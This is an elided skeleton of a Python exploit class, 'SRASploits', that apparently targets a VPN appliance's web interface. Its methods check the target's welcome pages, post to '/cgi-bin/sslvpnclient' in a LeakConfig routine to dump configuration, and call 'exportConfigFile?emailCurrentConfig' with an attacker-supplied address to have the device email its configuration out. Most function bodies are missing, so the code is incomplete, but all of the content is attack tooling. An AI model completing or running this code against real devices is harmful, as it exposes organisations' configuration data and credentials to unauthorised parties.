...
class SRASploits():
    ...
    def Verify(self):
        ...
        try:
            ...
            print(f"TRY CONNECT TO: {self.url + '/spog/welcome'}")
        ...
        if tr.status_code == 200:
            ...
            s.mount('http://', HTTPAdapter(max_retries=max_retr))
            s.mount('https://', HTTPAdapter(max_retries=max_retr))
            print(f"TRY CONNECT TO: {self.url + '/cgi-bin/welcome'}")
    ...
    def LeakConfig(self):
        ...
        for sess in sessions:
            ...
            s.mount('http://', HTTPAdapter(max_retries=max_retr))
            s.mount('https://', HTTPAdapter(max_retries=max_retr))
            print(f"TRY CONNECT TO: {self.url + '/cgi-bin/sslvpnclient'}")
            dumpr = s.post(
    ...
    def TryEmail(self):
        ...
        if self.Cookies is None:
            ...
            s.mount('http://', HTTPAdapter(max_retries=max_retr))
            s.mount('https://', HTTPAdapter(max_retries=max_retr))
            print(f"TRY CONNECT TO: {self.url + '/cgi-bin/exportConfigFile?emailCurrentConfig+' + self.email}")
